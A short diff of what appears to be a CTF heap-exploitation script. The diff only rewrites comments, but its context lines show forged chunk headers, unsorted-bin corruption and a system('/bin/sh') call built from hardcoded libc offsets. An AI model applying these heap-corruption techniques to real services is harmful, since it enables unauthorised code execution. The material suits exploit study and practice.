@@ -83,7 +83,7 @@ print "heap : ",hex(heap)
 
 for i in range(22):
     if i == 15 :
-        insert(sock,"A"*0xfd0 + pack(0) + pack(0x2001) + pack(heap) + pack(heap+ 0x120) ) #2
+        insert(sock,"A"*0xfd0 + pack(0) + pack(0x2001) + pack(heap) + pack(heap+ 0x120) ) #forge chunk header in mmap area
     else :
         insert(sock,chr(ord("a")+i)*0xfff) #2
 
@@ -112,7 +112,7 @@ merge(sock,9,18)
 merge(sock,8,10)
 merge(sock,9,30)
 merge(sock,4,4)
-merge(sock,7,8) #triger the mmap
+merge(sock,7,8) #trigger the mmap
 system = libc + 0x46640
 binsh = libc + 0x17ccdb
 insert(sock,"ddaa"*0x10 + pack(system) + pack(binsh)) #insert dtor_list object
@@ -123,7 +123,7 @@ dele(sock,7)
 dele(sock,10)
 dele(sock,8)
 
-#fake the unsortbin
+#corrupt the unsortbin
 update(sock,6,pack(libc + 0x3be7b8) + pack(libc + 0x7e0fe0))
 update(sock,9,pack(libc + 0x7e0fe0) + pack(libc + 0x3be7b8))
 insert(sock,"g"*0xfff)
